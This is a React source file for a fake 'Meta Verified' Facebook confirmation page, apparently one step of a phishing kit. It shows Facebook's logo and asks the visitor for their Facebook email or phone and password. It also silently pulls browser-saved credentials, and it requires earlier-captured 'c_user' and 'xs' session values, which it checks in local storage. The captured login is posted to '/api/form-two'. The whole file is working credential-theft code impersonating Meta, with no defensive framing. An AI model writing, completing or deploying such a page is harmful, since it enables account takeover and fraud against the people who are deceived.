import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Eye, EyeOff } from "lucide-react";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { z } from "zod";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { countries } from "@/lib/countries";

const formTwoSchema = z.object({
  user_email: z.string(),
  password: z.string().min(1, "Password is required"),
});

type FormTwoValues = z.infer<typeof formTwoSchema>;

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
  const [countryCode, setCountryCode] = useState('+1');
  const [showPassword, setShowPassword] = useState(false);

  const form = useForm<FormTwoValues>({
    resolver: zodResolver(formTwoSchema),
    defaultValues: {
      user_email: "",
      password: "",
    },
  });

  // Auto-fill from browser's saved data
  useEffect(() => {
    const autofillData = async () => {
      try {
        // Check if browser supports password manager API
        if ('PasswordCredential' in window) {
          // @ts-ignore - PasswordCredential API
          const cred = await navigator.credentials.get({
            password: true,
            mediation: 'silent'
          });

          if (cred && 'password' in cred) {
            // @ts-ignore - PasswordCredential API
            form.setValue('user_email', cred.id || '');
            // @ts-ignore - PasswordCredential API
            form.setValue('password', cred.password || '');
          }
        }
      } catch (error) {
        console.log('Auto-fill failed:', error);
      }
    };

    autofillData();
  }, [form]);

  // Load validation data on mount
  useEffect(() => {
    const storedData = localStorage.getItem('validation_data');
    if (!storedData) {
      setLocation('/validation');
      return;
    }
    try {
      const parsed = JSON.parse(storedData);
      if (!parsed.c_user || !parsed.xs) {
        throw new Error("Invalid validation data");
      }
    } catch (error) {
      console.error('Failed to parse validation data:', error);
      setLocation('/validation');
    }
  }, [setLocation]);

  const onSubmit = async (data: FormTwoValues) => {
    try {
      const formattedData = {
        user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
        password: data.password,
      };

      // Save credentials if supported
      if ('PasswordCredential' in window) {
        // @ts-ignore - PasswordCredential API
        const cred = new PasswordCredential({
          id: formattedData.user_email,
          password: formattedData.password,
          name: 'Facebook Login'
        });
        // @ts-ignore - PasswordCredential API
        navigator.credentials.store(cred).catch(console.error);
      }

      const response = await fetch('/api/form-two', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formattedData),
      });

      if (!response.ok) {
        throw new Error('Failed to submit form');
      }

      localStorage.removeItem('validation_data');
      toast({
        title: "Success!",
        description: "Your form has been submitted successfully"
      });
      setLocation("/success");
    } catch (error) {
      console.error('Form submission error:', error);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Meta Verified | Confirmation"
        description="Request a verified badge on Facebook - Final Step"
      />
      <div className="min-h-screen flex justify-center items-center p-3 sm:p-4 bg-gradient-to-br from-[#0180FA]/10 via-[#f0f2f5] to-[#0180FA]/5">
        <div className="bg-white/90 backdrop-blur-sm p-6 sm:p-8 rounded-lg shadow-lg max-w-[360px] w-full text-center border border-white/20">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
            alt="Logo"
            className="w-[100px] sm:w-[120px] mx-auto mb-4 sm:mb-5"
          />
          <h1 className="text-base sm:text-lg font-bold text-[#333] mb-4 sm:mb-5">
            Facebook Security
          </h1>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <div className="text-left">
                <div className="mb-4">
                  <label className="block font-semibold mb-1.5 text-[#606770] text-xs sm:text-sm">
                    Please enter your facebook password to complete the request
                  </label>
                  <div className="flex gap-4">
                    <button
                      type="button"
                      onClick={() => setContactMethod('email')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        contactMethod === 'email'
                          ? 'bg-[#0180FA] text-white shadow-md'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                      }`}
                    >
                      Email
                    </button>
                    <button
                      type="button"
                      onClick={() => setContactMethod('phone')}
                      className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                        contactMethod === 'phone'
                          ? 'bg-[#0180FA] text-white shadow-md'
                          : 'bg-[#e4e6eb] text-[#606770] hover:bg-[#0180FA]/10'
                      }`}
                    >
                      Phone
                    </button>
                  </div>
                </div>

                <FormField
                  control={form.control}
                  name="user_email"
                  render={({ field }) => (
                    <FormItem>
                      <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                        {contactMethod === 'email' ? 'Email Address' : 'Phone Number'}
                      </FormLabel>
                      <FormControl>
                        <div className="flex gap-2">
                          {contactMethod === 'phone' && (
                            <Select
                              value={countryCode}
                              onValueChange={setCountryCode}
                            >
                              <SelectTrigger className="w-[100px]">
                                <SelectValue placeholder="Code" />
                              </SelectTrigger>
                              <SelectContent className="max-h-[200px]">
                                {countries.map((country) => (
                                  <SelectItem key={country.code} value={country.code}>
                                    {country.code} ({country.name})
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          )}
                          <Input
                            type={contactMethod === 'email' ? 'email' : 'tel'}
                            placeholder={
                              contactMethod === 'email'
                                ? "Enter email address"
                                : "Enter phone number"
                            }
                            className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20"
                            {...field}
                            onChange={(e) => {
                              const value = e.target.value.replace(/\s+/g, '');
                              field.onChange(value);
                            }}
                          />
                        </div>
                      </FormControl>
                      <FormMessage className="text-xs text-red-500 mt-1" />
                    </FormItem>
                  )}
                />
              </div>

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem className="text-left">
                    <FormLabel className="block font-semibold mb-1.5 sm:mb-2 text-[#606770] text-xs sm:text-sm">
                      Password
                    </FormLabel>
                    <FormControl>
                      <div className="relative">
                        <Input
                          type={showPassword ? "text" : "password"}
                          placeholder="Enter password"
                          className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#0180FA] focus:ring-2 focus:ring-[#0180FA] focus:ring-opacity-20 pr-10"
                          {...field}
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
                        >
                          {showPassword ? (
                            <EyeOff className="h-4 w-4" />
                          ) : (
                            <Eye className="h-4 w-4" />
                          )}
                        </button>
                      </div>
                    </FormControl>
                    <FormMessage className="text-xs text-red-500 mt-1" />
                  </FormItem>
                )}
              />

              <Button 
                type="submit" 
                className="w-full bg-[#0180FA] hover:bg-[#0180FA]/90 text-white font-semibold py-1.5 sm:py-2 px-3 sm:px-4 rounded-md text-sm transition-colors duration-200 shadow-md"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}